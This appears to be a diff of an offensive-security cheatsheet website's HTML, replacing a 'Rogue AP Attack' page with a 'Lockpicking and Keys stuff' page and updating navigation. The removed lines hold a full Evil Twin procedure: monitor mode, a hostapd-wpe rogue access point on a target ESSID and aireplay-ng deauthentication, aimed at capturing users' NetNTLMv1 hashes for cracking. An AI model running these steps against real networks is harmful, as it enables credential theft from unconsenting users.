@@ -6,7 +6,7 @@
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="revised" content="2021-01-21T17:33:37 CET">
-<title>Rogue AP Attack :: Offensive Security Cheatsheet</title>
+<title>Lockpicking and Keys stuff :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -23,7 +23,7 @@
 
     
   </head>
-  <body data-url="/wireless/rogue_ap/">
+  <body data-url="/phishing-redteam-and-se/lockpicking_keys/">
     
       <header>
   <div class="logo">
@@ -1523,10 +1523,11 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/phishing-redteam-and-se/" class="dd-item haschildren
+    <li data-nav-id="/phishing-redteam-and-se/" class="dd-item parent haschildren
         ">
       <div>
-      <a href="/phishing-redteam-and-se/">Phishing, RedTeam and SE</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/phishing-redteam-and-se/">Phishing, RedTeam and SE</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
       <li data-nav-id="/phishing-redteam-and-se/phishing_campaign_setup/" class="dd-item">
@@ -1536,7 +1537,7 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/phishing-redteam-and-se/lockpicking_keys/" class="dd-item">
+      <li data-nav-id="/phishing-redteam-and-se/lockpicking_keys/" class="dd-item active">
         <div>
           <a href="/phishing-redteam-and-se/lockpicking_keys/">
             Lockpicking and Keys stuff
@@ -1545,11 +1546,10 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/wireless/" class="dd-item parent haschildren
+    <li data-nav-id="/wireless/" class="dd-item haschildren
         ">
       <div>
-      <a href="/wireless/">Wireless</a>
-            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/wireless/">Wireless</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
       <li data-nav-id="/wireless/wifi_cracking/" class="dd-item">
@@ -1559,7 +1559,7 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/wireless/rogue_ap/" class="dd-item active">
+      <li data-nav-id="/wireless/rogue_ap/" class="dd-item">
         <div>
           <a href="/wireless/rogue_ap/">
             Rogue AP Attack
@@ -1694,12 +1694,12 @@
     <option value="/passcracking-hashfiles/" >
    Passcracking Hash &amp; Files</option>
     <option value="/phishing-redteam-and-se/" >
-   Phishing, RedTeam and SE</option>
-    <option value="/wireless/" >
-   Wireless</option> 
-      <option value="/wireless/wifi_cracking/" >- WiFi Cracking</option>
-      <option value="/wireless/rogue_ap/"  selected>- Rogue AP Attack</option>
+   Phishing, RedTeam and SE</option> 
+      <option value="/phishing-redteam-and-se/phishing_campaign_setup/" >- Phishing Infrastructure (Gophish&#43;Vultr)</option>
+      <option value="/phishing-redteam-and-se/lockpicking_keys/"  selected>- Lockpicking and Keys stuff</option>
   
+    <option value="/wireless/" >
+   Wireless</option>
     <option value="/cryptography/" >
    Cryptography</option>
     <option value="/pwn/" >
@@ -1728,55 +1728,15 @@
       </div>
     
 
-    <h1>Rogue AP Attack</h1>
+    <h1>Lockpicking and Keys stuff</h1>
     
     
     
     
 
-<h3 id="general-informations">General Informations</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If you need several external eth interfaces, connect then at the beginning</span>
-<span style="color:#75715e"># To ensure having wlan0 and wlan1</span>
-<span style="color:#75715e"># And avoid having wlan0mon and then wlan0 when you connect the second one</span>
-<span style="color:#75715e"># It could result in conflicts</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Evil Twin / Hostapd-wpe is used against MSCHAPv2 access points, usually used by companies</span>
-<span style="color:#75715e"># Manually creating a rogue AP for classical WPA/WPA2 requires more configuration</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You might need to patch your hostapd version</span>
-https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe</code></pre></div>
-<p><br/></p>
-
-<h3 id="evil-twin-attack">Evil Twin attack</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 1/ Start monitoring mode</span>
-<span style="color:#75715e"># If you plan to use deauth attack, connect the 2 eth interfaces at the same time</span>
-<span style="color:#75715e"># To avoid having wlan0mon and wlan0 (it can conflict)</span>
-sudo airmon-ng start wlan0
-
-<span style="color:#75715e"># 2/ If process are blocking the monitoring mode, kill them</span>
-sudo airmon-ng check <span style="color:#111">kill</span>
-sudo <span style="color:#111">kill</span> &lt;PID&gt;
-
-<span style="color:#75715e"># 3/ Get the target AP (ESSID)</span>
-<span style="color:#75715e"># Your target can have multiples AP, and so multiples MAC addresses</span>
-<span style="color:#75715e"># They can run on differents channels</span>
-sudo airodump wlan0mon
-
-<span style="color:#75715e"># 4/ Then set the target in the configuration file</span>
-sudo nano /etc/hostapd-wpe/hostapd-wpe.conf
-<span style="color:#111">ssid</span><span style="color:#f92672">=</span>&lt;ESSID&gt;
-
-<span style="color:#75715e"># 5/ Start AP</span>
-<span style="color:#75715e"># You will only get people that newly connects to the target AP</span>
-<span style="color:#75715e"># If you want to get people already connected, you need to push the attack further with deauth</span>
-sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
-
-<span style="color:#75715e"># 6/ Start the second ethernet interface</span>
-sudo airmon-ng start wlan1
-
-<span style="color:#75715e"># 7/ Deauth (In another terminal)</span>
-<span style="color:#75715e"># Based on the differents ESSID and channels found in step 3</span>
-<span style="color:#75715e"># -0 is the number of deauth packet sent</span>
-sudo aireplay-ng -0 <span style="color:#ae81ff">10</span> -a &lt;mac address&gt; -c &lt;channel&gt;
-
-<span style="color:#75715e"># Then wait for credz \o/</span>
-<span style="color:#75715e"># You will probably get NetNTLMv1 hashes you will need to crack</span></code></pre></div>
+<h3 id="key-decoder">Key Decoder</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://github.com/MaximeBeasse/KeyDecoder
+https://twitter.com/FrenchKey_fr/status/1343543963454754816?s<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span></code></pre></div>
 <p><br/></p>
 
 
@@ -1784,8 +1744,8 @@ sudo aireplay-ng -0 <span style="color:#ae81ff">10</span> -a &lt;mac address&gt;
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/wireless/wifi_cracking/" title="WiFi Cracking"> <i class="fa fa-chevron-left"></i><label>WiFi Cracking</label></a>
-    <a class="nav nav-next" href="/cryptography/" title="Cryptography" style="margin-right: 0px;"><label>Cryptography</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/phishing-redteam-and-se/phishing_campaign_setup/" title="Phishing Infrastructure (Gophish&#43;Vultr)"> <i class="fa fa-chevron-left"></i><label>Phishing Infrastructure (Gophish&#43;Vultr)</label></a>
+    <a class="nav nav-next" href="/wireless/" title="Wireless" style="margin-right: 0px;"><label>Wireless</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -1802,7 +1762,7 @@ sudo aireplay-ng -0 <span style="color:#ae81ff">10</span> -a &lt;mac address&gt;
 
     
     <div class="github-link">
-      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Wireless/Rogue_AP.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Phishing,%20RedTeam%20and%20SE/lockpicking_keys.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
